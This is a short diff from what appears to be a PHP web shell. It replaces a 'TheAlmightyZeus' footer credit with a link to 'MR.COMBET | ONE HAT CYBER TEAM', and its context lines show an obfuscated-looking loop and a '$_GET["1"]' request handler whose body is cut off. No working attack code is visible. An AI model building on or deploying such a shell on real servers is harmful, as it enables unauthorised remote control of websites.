@@ -481,7 +481,7 @@ for($i=0;$i<$___;$i++) {
 
 			</article>
 			<footer class="x">
-				&copy;TheAlmightyZeus
+				<a href="https://www.facebook.com/combet.ohct/">MR.COMBET | ONE HAT CYBER TEAM</a>
 			</footer>
 			<?php
 			if(isset($_GET["1"])) {
